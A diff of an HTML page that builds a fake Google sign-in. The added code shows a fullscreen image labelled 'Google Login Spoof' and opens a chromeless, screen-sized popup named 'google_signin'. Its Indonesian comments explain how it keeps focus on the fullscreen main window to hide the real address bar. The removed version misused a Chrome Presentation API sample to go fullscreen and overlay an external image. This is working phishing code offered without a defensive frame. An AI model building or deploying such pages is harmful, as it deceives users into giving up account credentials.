@@ -1,139 +1,93 @@
-
-<p>
-  <button id="start">click here please</button>
-</p>
-<p>
-
-<script>
-  var ChromeSamples = {
-    log: function() {
-      var line = Array.prototype.slice.call(arguments).map(function(argument) {
-        return typeof argument === 'string' ? argument : JSON.stringify(argument);
-      }).join(' ');
-
-      document.querySelector('#log').textContent += line + '\n';
-    },
-
-    clearLog: function() {
-      document.querySelector('#log').textContent = '';
-    },
-
-    setStatus: function(status) {
-      document.querySelector('#status').textContent = status;
-    },
-
-    setContent: function(newContent) {
-      var content = document.querySelector('#content');
-      while(content.hasChildNodes()) {
-        content.removeChild(content.lastChild);
-      }
-      content.appendChild(newContent);
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <title>URL TESTING WEBVIEW</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-  };
-</script>
+    #spoof-img {
+      display: none;
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+    }
+    .signin-link {
+      padding: 20px 40px;
+      background: #4285f4;
+      color: white;
+      font-size: 18px;
+      text-decoration: none;
+      border-radius: 4px;
+      cursor: pointer;
+      z-index: 10;
+      position: relative;
+    }
+  </style>
+  <script>
+    function goFullscreen() {
+      var elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+      } else if (elem.mozRequestFullScreen) {
+        elem.mozRequestFullScreen();
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+      }
+    }
 
-<div id="output" class="output">
-  <div id="content"></div>
-  <div id="status"></div>
-  <pre id="log"></pre>
-</div>
+    function openWin() {
+      // 1. Langsung tampilkan spoof.png
+      document.getElementById("spoof-img").style.display = "block";
 
+      // 2. Langsung fullscreen main window (pasti berhasil karena masih dalam gesture)
+      goFullscreen();
 
+      // 3. Sembunyikan tombol setelah 1 detik
+      setTimeout(function () {
+        document.querySelector(".signin-link").style.display = "none";
+      }, 1000);
 
+      // 4. BUKA POPUP BESAR SECARA LANGSUNG (tanpa delay besar)
+      //    JANGAN panggil win.focus() → agar fokus tetap di main window!
+      var params = 
+        "width=" + screen.width +
+        ",height=" + screen.height +
+        ",top=0,left=0" +
+        ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";
 
-<script>
-  log = ChromeSamples.log;
-</script>
+      var win = window.open("opener.html", "google_signin", params);
 
+      if (win) {
+        win.moveTo(0, 0);
+        win.resizeTo(screen.width, screen.height);
+        // TIDAK panggil win.focus() → fullscreen main window tetap aktif!
+      }
+    }
+  </script>
+</head>
+<body>
+  <!-- Tombol utama -->
+  <a href="#" class="signin-link" onclick="openWin(); return false;">
+    Click here to sign in into your Google Account
+  </a>
 
-
-  
-    
-      <script>
-const presentationRequest = new PresentationRequest(['receiver/index.html']);
-
-// Make this presentation the default one when using the "Cast" browser menu.
-navigator.presentation.defaultRequest = presentationRequest;
-
-let presentationConnection;
-
-document.querySelector('#start').addEventListener('click', function() {
-	document.body.webkitRequestFullscreen();
-    log('Starting presentation request...');
-	setTimeout(function(){presentationRequest.start();document.body.innerHTML='<img src=https://scontent.fmad3-1.fna.fbcdn.net/v/t31.0-8/27907993_10213005390063869_9134525451984292054_o.jpg?oh=60751f26196ad8042695c8e8c13a40df&oe=5ADBFE09 width=\'101.5%\' height=\'9%\' style=\'margin-left:-8px;margin-top:-6px\' />'}, 80)
-  .then(connection => {
-    log('> Connected to ' + connection.url + ', id: ' + connection.id);
-  })
-  .catch(error => {
-    log('> ' + error.name + ': ' + error.message);
-  });
-});
-
-presentationRequest.addEventListener('connectionavailable', function(event) {
-  presentationConnection = event.connection;
-  presentationConnection.addEventListener('close', function() {
-    log('> Connection closed.');
-  });
-  presentationConnection.addEventListener('terminate', function() {
-    log('> Connection terminated.');
-  });
-  presentationConnection.addEventListener('message', function(event) {
-    log('> ' + event.data);
-  });
-});
-
-document.querySelector('#sendMessage').addEventListener('click', function() {
-  const message = document.querySelector('#message').value.trim();
-  const lang = document.body.lang || 'en-US';
-
-  log('Sending "' + message + '"...');
-  presentationConnection.send(JSON.stringify({message, lang}));
-});
-
-document.querySelector('#close').addEventListener('click', function() {
-  log('Closing connection...');
-  presentationConnection.close();
-});
-
-document.querySelector('#terminate').addEventListener('click', function() {
-  log('Terminating connection...');
-  presentationConnection.terminate();
-});
-
-document.querySelector('#reconnect').addEventListener('click', () => {
-  const presentationId = document.querySelector('#presentationId').value.trim();
-
-  presentationRequest.reconnect(presentationId)
-  .then(connection => {
-    log('Reconnected to ' + connection.id);
-  })
-  .catch(error => {
-    log('Presentation.reconnect() error, ' + error.name + ': ' + error.message);
-  });
-});
-
-/* Availability monitoring */
-
-presentationRequest.getAvailability()
-.then(availability => {
-  log('Available presentation displays: ' + availability.value);
-  availability.addEventListener('change', function() {
-    log('> Available presentation displays: ' + availability.value);
-  });
-})
-.catch(error => {
-  log('Presentation availability not supported, ' + error.name + ': ' +
-      error.message);
-});
-
-</script>
-    
-  
-
-  
-  
-
-
-
-  </body>
+  <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
+</body>
 </html>
